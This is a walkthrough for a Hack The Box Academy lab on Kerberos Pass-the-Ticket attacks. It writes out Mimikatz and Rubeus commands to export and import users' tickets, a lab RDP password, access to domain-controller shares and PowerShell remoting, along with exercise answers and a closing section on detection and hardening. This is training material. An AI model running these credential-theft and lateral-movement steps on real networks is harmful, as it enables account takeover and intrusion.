# 🛰️ HTB Pass-the-Ticket Lab Guide

## 🔍 Overview
[!ABSTRACT] This guide provides a step-by-step walkthrough of performing Kerberos Ticket Granting Ticket (TGT) attacks in a controlled lab environment, following the HTB Academy Password Attacks module. It covers exporting tickets with Mimikatz, using them to access shared folders and execute commands remotely on a domain controller.

---

## 🚀 Lab Setup
[!INFO] Before starting, ensure you have administrative rights on the target machine (e.g., via RDP as `Administrator`). The lab environment includes computers named MS01 and DC01 within the INLANEFREIGHT.HTB domain.

### Exercise 1: TGT Collection

```cmd
# RDP to target machine  
xfreerdp /v:10.129.164.157 /u:Administrator /p:'AnotherC0mpl3xP4$$'

# One-line Mimikatz export command
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# List all .kirbi files
dir

# Expected .kirbi files (example):
[0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi    (computer account)
[0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi    (computer account)
[0;45828]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi  (USER TGT)
[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi   (USER TGT)
[0;46eb9]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi  (USER TGT)

# Count only USER TGTs (exclude computer accounts ending with $)
```

**Answer**: **3** user TGTs (julio, john, david)

### Exercise 2: John's Share Access
[!CHECK] Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john

```cmd
# Import john's TGT with Mimikatz
C:\tools\mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

# Access john's shared folder
dir \\DC01.inlanefreight.htb\john

# Read the flag
type \\DC01.inlanefreight.htb\john\john.txt
```

**Expected Output**:
```cmd
Directory of \\DC01.inlanefreight.htb\john
07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  03:54 PM                30 john.txt
               1 File(s)             30 bytes
```

### Exercise 3: PowerShell Remoting
[!CHECK] Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

```cmd
# Navigate to tools directory
cd C:\tools

# Import john's TGT with Mimikatz
mimikatz.exe
kerberos::ptt C:\tools\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
exit

# Launch PowerShell from same Command Prompt
powershell

# Connect via PowerShell Remoting
Enter-PSSession -ComputerName DC01

# Read flag file
cat C:\john\john.txt
```

**Expected Session**:
```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> cat C:\john\john.txt
[FLAG_CONTENT]
```

### Key Lab Insights

#### Ticket Identification Patterns
```bash
# Computer account tickets (ignore for user count)
*MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi

# User TGT tickets (count these)
*julio@krbtgt-INLANEFREIGHT.HTB.kirbi
*john@krbtgt-INLANEFREIGHT.HTB.kirbi  
*david@krbtgt-INLANEFREIGHT.HTB.kirbi
```

#### Critical Command Sequence
```cmd
1. Export: mimikatz "privilege::debug" "sekurlsa::tickets /export" exit
2. Import: kerberos::ptt "[ticket-path]"
3. Test: dir \\DC01.inlanefreight.htb\[username]
4. Remote: Enter-PSSession -ComputerName DC01
```

#### Success Indicators
- **Exercise 1**: Count = 3 (julio, john, david)
- **Exercise 2**: Successful SMB share access to john folder
- **Exercise 3**: Remote PowerShell session established as john

### Optional: Tool Comparison
**Objective**: Perform attacks using both Mimikatz and Rubeus independently

**Mimikatz-Only Approach:**
```cmd
# Export tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# Import and test
mimikatz.exe "privilege::debug" "kerberos::ptt ticket.kirbi" "exit"
```

**Rubeus-Only Approach:**
```cmd
# Dump tickets
Rubeus.exe dump /nowrap

# Import and test  
Rubeus.exe ptt /ticket:base64_ticket_data
```

---

## 🛡️ Detection and Defense
[!WARNING] Be cautious when performing these steps as they could be detected by security monitoring systems.

### Detection Indicators
```bash
# Event Log Monitoring
# Event ID 4768 - TGT Request
# Event ID 4769 - TGS Request  
# Event ID 4624 - Logon with unusual characteristics

# Unusual ticket requests:
- RC4 encryption in AES-enabled domain
- Tickets requested outside normal hours
- Multiple TGT requests for same user
- Cross-domain ticket requests
```

### Defensive Measures
```bash
# Account Security
✅ Implement least privilege access
✅ Regular password rotation for service accounts
✅ Monitor privileged account usage

# Kerberos Hardening
✅ Enforce AES encryption only
✅ Reduce ticket lifetime
✅ Enable Kerberos logging
✅ Monitor for downgrade attacks

# Network Monitoring
✅ Monitor Kerberos traffic (port 88)
✅ Detect unusual authentication patterns
✅ Implement honeypot accounts
```

---

## 🔗 Related Techniques
### Comparison Matrix
| Technique | Auth Method | Requirements | Stealth Level |
|-----------|-------------|--------------|---------------|
| **Pass the Hash** | NTLM | Admin + Hash | Medium |
| **Pass the Ticket** | Kerberos | Valid Ticket | High |
| **Pass the Key** | Kerberos | Key/Hash | High |
| **Golden Ticket** | Kerberos | krbtgt Hash | Very High |
| **Silver Ticket** | Kerberos | Service Hash | Very High |

### Lateral Movement Chain
```bash
1. Initial Access → Credential Dumping
2. Extract NTLM Hash → Pass the Hash
3. Extract Kerberos Keys → Pass the Key  
4. Generate TGT → Pass the Ticket
5. Access Target Resources → Further Exploitation
```

---

## 📚 References

- **HTB Academy**: Password Attacks Module - Pass the Ticket
- **Mimikatz Documentation**: Kerberos attacks and ticket manipulation
- **Rubeus Documentation**: .NET tool for Kerberos abuse
- **Microsoft**: Kerberos Authentication Technical Reference
- **NIST**: Guidelines for Kerberos implementations